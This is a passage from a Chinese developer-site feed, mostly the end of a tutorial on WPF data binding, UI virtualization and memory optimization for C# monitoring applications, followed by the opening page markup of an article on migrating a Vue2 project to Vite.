                <span class="hljs-tag">&lt;<span class="hljs-name">DataTemplate</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">Border</span> <span class="hljs-attr">Margin</span>=<span class="hljs-string">"5"</span> <span class="hljs-attr">Padding</span>=<span class="hljs-string">"10"</span> <span class="hljs-attr">Background</span>=<span class="hljs-string">"LightGray"</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">StackPanel</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">TextBlock</span> <span class="hljs-attr">Text</span>=<span class="hljs-string">"{Binding DeviceName}"</span> 
                                       <span class="hljs-attr">FontWeight</span>=<span class="hljs-string">"Bold"</span>/&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">TextBlock</span> <span class="hljs-attr">Text</span>=<span class="hljs-string">"{Binding TemperatureFormatted}"</span> 
                                       <span class="hljs-attr">Foreground</span>=<span class="hljs-string">"Red"</span>/&gt;</span>
                        <span class="hljs-tag">&lt;/<span class="hljs-name">StackPanel</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">Border</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">DataTemplate</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">ItemsControl.ItemTemplate</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">ItemsControl.ItemsPanel</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">ItemsPanelTemplate</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">VirtualizingStackPanel</span>/&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">ItemsPanelTemplate</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">ItemsControl.ItemsPanel</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">ItemsControl</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">Grid</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">Window</span>&gt;</span>
</code></pre>
<h2 data-id="heading-4">二、虚拟化 (Virtualization)</h2>
<h3 data-id="heading-5">1. UI虚拟化实现</h3>
<p>csharp</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// 自定义虚拟化数据源</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">VirtualizedDataSource</span>&lt;<span class="hljs-title">T</span>&gt; : <span class="hljs-title">IList</span>, <span class="hljs-title">INotifyCollectionChanged</span>
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> List&lt;T&gt; _data;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> <span class="hljs-built_in">int</span> _pageSize;
    <span class="hljs-keyword">private</span> Dictionary&lt;<span class="hljs-built_in">int</span>, T&gt; _cache;
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">VirtualizedDataSource</span>(<span class="hljs-params">IEnumerable&lt;T&gt; data, <span class="hljs-built_in">int</span> pageSize = <span class="hljs-number">100</span></span>)</span>
    {
        _data = data.ToList();
        _pageSize = pageSize;
        _cache = <span class="hljs-keyword">new</span> Dictionary&lt;<span class="hljs-built_in">int</span>, T&gt;();
    }
    
    <span class="hljs-comment">// 虚拟化访问</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">object</span> <span class="hljs-keyword">this</span>[<span class="hljs-built_in">int</span> index]
    {
        <span class="hljs-keyword">get</span>
        {
            <span class="hljs-keyword">if</span> (!_cache.ContainsKey(index))
            {
                <span class="hljs-comment">// 加载数据页</span>
                LoadPage(index / _pageSize);
            }
            <span class="hljs-keyword">return</span> _cache[index];
        }
        <span class="hljs-keyword">set</span> =&gt; <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> NotImplementedException();
    }
    
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">LoadPage</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> pageNumber</span>)</span>
    {
        <span class="hljs-built_in">int</span> start = pageNumber * _pageSize;
        <span class="hljs-built_in">int</span> end = Math.Min(start + _pageSize, _data.Count);
        
        <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = start; i &lt; end; i++)
        {
            _cache[i] = _data[i];
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> Count =&gt; _data.Count;
    
    <span class="hljs-comment">// 实现其他必要接口...</span>
}

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">LargeDataViewModel</span>
{
    <span class="hljs-keyword">public</span> VirtualizedDataSource&lt;DeviceData&gt; VirtualizedDevices { <span class="hljs-keyword">get</span>; }
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">LargeDataViewModel</span>()</span>
    {
        <span class="hljs-comment">// 生成大量数据</span>
        <span class="hljs-keyword">var</span> data = Enumerable.Range(<span class="hljs-number">1</span>, <span class="hljs-number">100000</span>)
            .Select(i =&gt; <span class="hljs-keyword">new</span> DeviceData
            {
                DeviceName = <span class="hljs-string">$"设备_<span class="hljs-subst">{i}</span>"</span>,
                Temperature = <span class="hljs-number">20</span> + i % <span class="hljs-number">30</span>,
                Timestamp = DateTime.Now.AddSeconds(-i)
            });
        
        VirtualizedDevices = <span class="hljs-keyword">new</span> VirtualizedDataSource&lt;DeviceData&gt;(data);
    }
}
</code></pre>
<h3 data-id="heading-6">2. 高级虚拟化配置</h3>
<p>xml</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 虚拟化ListView --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">ListView</span> <span class="hljs-attr">ItemsSource</span>=<span class="hljs-string">"{Binding VirtualizedDevices}"</span>
          <span class="hljs-attr">VirtualizingPanel.IsVirtualizing</span>=<span class="hljs-string">"True"</span>
          <span class="hljs-attr">VirtualizingPanel.VirtualizationMode</span>=<span class="hljs-string">"Recycling"</span>
          <span class="hljs-attr">VirtualizingPanel.ScrollUnit</span>=<span class="hljs-string">"Pixel"</span>
          <span class="hljs-attr">VirtualizingPanel.CacheLength</span>=<span class="hljs-string">"100,100"</span>
          <span class="hljs-attr">ScrollViewer.CanContentScroll</span>=<span class="hljs-string">"True"</span>
          <span class="hljs-attr">ScrollViewer.IsDeferredScrollingEnabled</span>=<span class="hljs-string">"True"</span>&gt;</span>
    
    <span class="hljs-tag">&lt;<span class="hljs-name">ListView.View</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">GridView</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">GridViewColumn</span> <span class="hljs-attr">Header</span>=<span class="hljs-string">"ID"</span> 
                            <span class="hljs-attr">DisplayMemberBinding</span>=<span class="hljs-string">"{Binding DeviceName}"</span>/&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">GridViewColumn</span> <span class="hljs-attr">Header</span>=<span class="hljs-string">"温度"</span>
                            <span class="hljs-attr">DisplayMemberBinding</span>=<span class="hljs-string">"{Binding TemperatureFormatted}"</span>/&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">GridView</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">ListView.View</span>&gt;</span>
    
    <span class="hljs-tag">&lt;<span class="hljs-name">ListView.ItemsPanel</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">ItemsPanelTemplate</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">VirtualizingStackPanel</span> <span class="hljs-attr">VirtualizingPanel.ScrollUnit</span>=<span class="hljs-string">"Pixel"</span>/&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">ItemsPanelTemplate</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">ListView.ItemsPanel</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">ListView</span>&gt;</span>

<span class="hljs-comment">&lt;!-- 虚拟化TreeView --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">TreeView</span> <span class="hljs-attr">VirtualizingStackPanel.IsVirtualizing</span>=<span class="hljs-string">"True"</span>
          <span class="hljs-attr">VirtualizingStackPanel.VirtualizationMode</span>=<span class="hljs-string">"Recycling"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">TreeView.ItemTemplate</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">HierarchicalDataTemplate</span> <span class="hljs-attr">ItemsSource</span>=<span class="hljs-string">"{Binding Children}"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">TextBlock</span> <span class="hljs-attr">Text</span>=<span class="hljs-string">"{Binding Name}"</span>/&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">HierarchicalDataTemplate</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">TreeView.ItemTemplate</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">TreeView</span>&gt;</span>
</code></pre>
<h3 data-id="heading-7">3. 异步虚拟化加载</h3>
<p>csharp</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">AsyncVirtualizedCollection</span>&lt;<span class="hljs-title">T</span>&gt; : <span class="hljs-title">ObservableCollection</span>&lt;<span class="hljs-title">T</span>&gt;, <span class="hljs-title">IList</span>, <span class="hljs-title">INotifyCollectionChanged</span>
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> Func&lt;<span class="hljs-built_in">int</span>, Task&lt;IEnumerable&lt;T&gt;&gt;&gt; _dataLoader;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> <span class="hljs-built_in">int</span> _pageSize;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> Dictionary&lt;<span class="hljs-built_in">int</span>, List&lt;T&gt;&gt; _loadedPages;
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">int</span> _totalCount;
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">AsyncVirtualizedCollection</span>(<span class="hljs-params">
        Func&lt;<span class="hljs-built_in">int</span>, <span class="hljs-built_in">int</span>, Task&lt;IEnumerable&lt;T&gt;&gt;&gt; dataLoader, 
        <span class="hljs-built_in">int</span> totalCount, 
        <span class="hljs-built_in">int</span> pageSize = <span class="hljs-number">50</span></span>)</span>
    {
        _dataLoader = (page) =&gt; dataLoader(page * pageSize, pageSize);
        _totalCount = totalCount;
        _pageSize = pageSize;
        _loadedPages = <span class="hljs-keyword">new</span> Dictionary&lt;<span class="hljs-built_in">int</span>, List&lt;T&gt;&gt;();
    }
    
    <span class="hljs-comment">// 重写索引器实现虚拟化</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">new</span> T <span class="hljs-keyword">this</span>[<span class="hljs-built_in">int</span> index]
    {
        <span class="hljs-keyword">get</span>
        {
            <span class="hljs-built_in">int</span> page = index / _pageSize;
            <span class="hljs-built_in">int</span> pageIndex = index % _pageSize;
            
            <span class="hljs-keyword">if</span> (!_loadedPages.ContainsKey(page))
            {
                <span class="hljs-comment">// 异步加载页面</span>
                LoadPageAsync(page).Wait();
            }
            
            <span class="hljs-keyword">return</span> _loadedPages[page][pageIndex];
        }
        <span class="hljs-keyword">set</span> =&gt; <span class="hljs-keyword">base</span>[index] = <span class="hljs-keyword">value</span>;
    }
    
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">LoadPageAsync</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> page</span>)</span>
    {
        <span class="hljs-keyword">var</span> data = <span class="hljs-keyword">await</span> _dataLoader(page);
        _loadedPages[page] = data.ToList();
        
        <span class="hljs-comment">// 触发UI更新</span>
        OnCollectionChanged(<span class="hljs-keyword">new</span> NotifyCollectionChangedEventArgs(
            NotifyCollectionChangedAction.Reset));
    }
    
    <span class="hljs-comment">// 实现其他必要方法...</span>
}

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">DataService</span>
{
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task&lt;IEnumerable&lt;DeviceData&gt;&gt; GetDevicesAsync(<span class="hljs-built_in">int</span> skip, <span class="hljs-built_in">int</span> take)
    {
        <span class="hljs-comment">// 模拟数据库查询</span>
        <span class="hljs-keyword">await</span> Task.Delay(<span class="hljs-number">100</span>);
        
        <span class="hljs-keyword">return</span> Enumerable.Range(skip, take)
            .Select(i =&gt; <span class="hljs-keyword">new</span> DeviceData
            {
                DeviceName = <span class="hljs-string">$"Device_<span class="hljs-subst">{i}</span>"</span>,
                Temperature = <span class="hljs-number">20</span> + i % <span class="hljs-number">30</span>
            });
    }
}
</code></pre>
<h2 data-id="heading-8">三、性能优化技巧</h2>
<h3 data-id="heading-9">1. 绑定优化</h3>
<p>csharp</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// 1. 使用延迟绑定</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">DelayedBindingHelper</span>
{
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">readonly</span> DependencyProperty DelayedTextProperty =
        DependencyProperty.RegisterAttached(
            <span class="hljs-string">"DelayedText"</span>,
            <span class="hljs-keyword">typeof</span>(<span class="hljs-built_in">string</span>),
            <span class="hljs-keyword">typeof</span>(DelayedBindingHelper),
            <span class="hljs-keyword">new</span> FrameworkPropertyMetadata(
                <span class="hljs-literal">null</span>,
                FrameworkPropertyMetadataOptions.BindsTwoWayByDefault,
                OnDelayedTextChanged,
                <span class="hljs-literal">null</span>,
                <span class="hljs-literal">false</span>,
                UpdateSourceTrigger.LostFocus));
    
    <span class="hljs-comment">// 2. 绑定验证和转换优化</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">TemperatureConverter</span> : <span class="hljs-title">IValueConverter</span>
    {
        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">object</span> <span class="hljs-title">Convert</span>(<span class="hljs-params"><span class="hljs-built_in">object</span> <span class="hljs-keyword">value</span>, Type targetType, <span class="hljs-built_in">object</span> parameter, CultureInfo culture</span>)</span>
        {
            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">value</span> <span class="hljs-keyword">is</span> <span class="hljs-built_in">double</span> temp)
            {
                <span class="hljs-keyword">return</span> <span class="hljs-string">$"<span class="hljs-subst">{temp:F2}</span> °C"</span>;
            }
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>.Empty;
        }
        
        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">object</span> <span class="hljs-title">ConvertBack</span>(<span class="hljs-params"><span class="hljs-built_in">object</span> <span class="hljs-keyword">value</span>, Type targetType, <span class="hljs-built_in">object</span> parameter, CultureInfo culture</span>)</span>
        {
            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">value</span> <span class="hljs-keyword">is</span> <span class="hljs-built_in">string</span> str &amp;&amp; <span class="hljs-built_in">double</span>.TryParse(str, <span class="hljs-keyword">out</span> <span class="hljs-built_in">double</span> temp))
            {
                <span class="hljs-keyword">return</span> temp;
            }
            <span class="hljs-keyword">return</span> <span class="hljs-number">0.0</span>;
        }
    }
}
</code></pre>
<h3 data-id="heading-10">2. 内存管理</h3>
<p>csharp</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">MemoryOptimizedListBox</span> : <span class="hljs-title">ListBox</span>
{
    <span class="hljs-comment">// 实现自定义虚拟化面板</span>
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">PrepareContainerForItemOverride</span>(<span class="hljs-params">
        DependencyObject element, <span class="hljs-built_in">object</span> item</span>)</span>
    {
        <span class="hljs-keyword">base</span>.PrepareContainerForItemOverride(element, item);
        
        <span class="hljs-comment">// 为可见项设置数据上下文</span>
        <span class="hljs-keyword">if</span> (element <span class="hljs-keyword">is</span> FrameworkElement frameworkElement)
        {
            frameworkElement.DataContext = item;
        }
    }
    
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">ClearContainerForItemOverride</span>(<span class="hljs-params">
        DependencyObject element, <span class="hljs-built_in">object</span> item</span>)</span>
    {
        <span class="hljs-comment">// 清理资源</span>
        <span class="hljs-keyword">if</span> (element <span class="hljs-keyword">is</span> FrameworkElement frameworkElement)
        {
            frameworkElement.DataContext = <span class="hljs-literal">null</span>;
        }
        
        <span class="hljs-keyword">base</span>.ClearContainerForItemOverride(element, item);
    }
}
</code></pre>
<h2 data-id="heading-11">四、实际应用示例</h2>
<h3 data-id="heading-12">监控系统示例</h3>
<p>csharp</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">MonitoringSystem</span>
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> Timer _updateTimer;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> Random _random;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> DeviceViewModel _viewModel;
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">MonitoringSystem</span>(<span class="hljs-params">DeviceViewModel viewModel</span>)</span>
    {
        _viewModel = viewModel;
        _random = <span class="hljs-keyword">new</span> Random();
        _updateTimer = <span class="hljs-keyword">new</span> Timer(UpdateData, <span class="hljs-literal">null</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1000</span>);
    }
    
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">UpdateData</span>(<span class="hljs-params"><span class="hljs-built_in">object</span> state</span>)</span>
    {
        <span class="hljs-comment">// 模拟实时数据更新</span>
        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">var</span> device <span class="hljs-keyword">in</span> _viewModel.Devices)
        {
            device.Temperature = <span class="hljs-number">20</span> + _random.NextDouble() * <span class="hljs-number">15</span>;
            device.Timestamp = DateTime.Now;
        }
    }
    
    <span class="hljs-comment">// 动态添加/移除设备</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">AddNewDevice</span>()</span>
    {
        Application.Current.Dispatcher.Invoke(() =&gt;
        {
            _viewModel.AddDevice(<span class="hljs-string">$"设备_<span class="hljs-subst">{Guid.NewGuid().ToString().Substring(<span class="hljs-number">0</span>, <span class="hljs-number">8</span>)}</span>"</span>);
        });
    }
}
</code></pre>
<h3 data-id="heading-13">配置虚拟化参数</h3>
<p>xml</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- App.xaml 或 资源字典 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Application.Resources</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">Style</span> <span class="hljs-attr">TargetType</span>=<span class="hljs-string">"ListBox"</span>&gt;</span><span class="xml">
        <span class="hljs-tag">&lt;<span class="hljs-name">Setter</span> <span class="hljs-attr">Property</span>=<span class="hljs-string">"VirtualizingPanel.IsVirtualizing"</span> <span class="hljs-attr">Value</span>=<span class="hljs-string">"True"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Setter</span> <span class="hljs-attr">Property</span>=<span class="hljs-string">"VirtualizingPanel.VirtualizationMode"</span> <span class="hljs-attr">Value</span>=<span class="hljs-string">"Recycling"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Setter</span> <span class="hljs-attr">Property</span>=<span class="hljs-string">"VirtualizingPanel.CacheLength"</span> <span class="hljs-attr">Value</span>=<span class="hljs-string">"50,50"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Setter</span> <span class="hljs-attr">Property</span>=<span class="hljs-string">"ScrollViewer.CanContentScroll"</span> <span class="hljs-attr">Value</span>=<span class="hljs-string">"True"</span>/&gt;</span>
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">Style</span>&gt;</span>
    
    <span class="hljs-tag">&lt;<span class="hljs-name">Style</span> <span class="hljs-attr">TargetType</span>=<span class="hljs-string">"DataGrid"</span>&gt;</span><span class="xml">
        <span class="hljs-tag">&lt;<span class="hljs-name">Setter</span> <span class="hljs-attr">Property</span>=<span class="hljs-string">"EnableRowVirtualization"</span> <span class="hljs-attr">Value</span>=<span class="hljs-string">"True"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Setter</span> <span class="hljs-attr">Property</span>=<span class="hljs-string">"EnableColumnVirtualization"</span> <span class="hljs-attr">Value</span>=<span class="hljs-string">"True"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Setter</span> <span class="hljs-attr">Property</span>=<span class="hljs-string">"RowHeight"</span> <span class="hljs-attr">Value</span>=<span class="hljs-string">"25"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Setter</span> <span class="hljs-attr">Property</span>=<span class="hljs-string">"VirtualizingPanel.ScrollUnit"</span> <span class="hljs-attr">Value</span>=<span class="hljs-string">"Pixel"</span>/&gt;</span>
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">Style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">Application.Resources</span>&gt;</span>
</code></pre>
<h2 data-id="heading-14">五、最佳实践总结</h2>
<ol>
<li>
<p><strong>动态绑定</strong>：</p>
<ul>
<li>使用 <code>ObservableCollection&lt;T&gt;</code> 实现动态集合</li>
<li>实现 <code>INotifyPropertyChanged</code> 实现属性变更通知</li>
<li>使用 <code>Dispatcher</code> 在UI线程更新</li>
</ul>
</li>
<li>
<p><strong>虚拟化优化</strong>：</p>
<ul>
<li>大量数据时启用虚拟化</li>
<li>使用回收模式 (<code>VirtualizationMode="Recycling"</code>)</li>
<li>合理设置缓存长度</li>
<li>避免嵌套虚拟化容器</li>
</ul>
</li>
<li>
<p><strong>性能监控</strong>：</p>
<p>csharp</p>
<pre><code class="hljs language-ini" lang="ini">// 监控虚拟化性能
<span class="hljs-attr">PresentationTraceSources.DataBindingSource.Switch.Level</span> = 
    SourceLevels.Warning | SourceLevels.Error<span class="hljs-comment">;</span>
</code></pre>
</li>
<li>
<p><strong>内存优化</strong>：</p>
<ul>
<li>及时释放不需要的绑定</li>
<li>使用弱引用处理大型对象</li>
<li>分页加载大数据集</li>
</ul>
</li>
</ol>
<p>这些技术结合使用，可以显著提升C#上位机应用程序的性能和响应速度，特别是在处理大量实时数据时。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[详解把老旧的vue2+vue-cli+node-sass项目升级为vite]]></title>    <link>https://juejin.cn/post/7589903499599364150</link>    <guid>https://juejin.cn/post/7589903499599364150</guid>    <pubDate>2026-01-01T08:21:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589903499599364150" data-draft-id="7589553649133338633" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" 详解把老旧的vue2+vue-cli+node-sass项目升级为vite"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2026-01-01T08:21:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="mikan"/> <meta itemprop="url" content="https://juejin.cn/user/1239904848454103"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             详解把老旧的vue2+vue-cli+node-sass项目升级为vite
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1239904848454103/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    mikan
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T08:21:38.000Z" title="Thu Jan 01 2026 08:21:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag 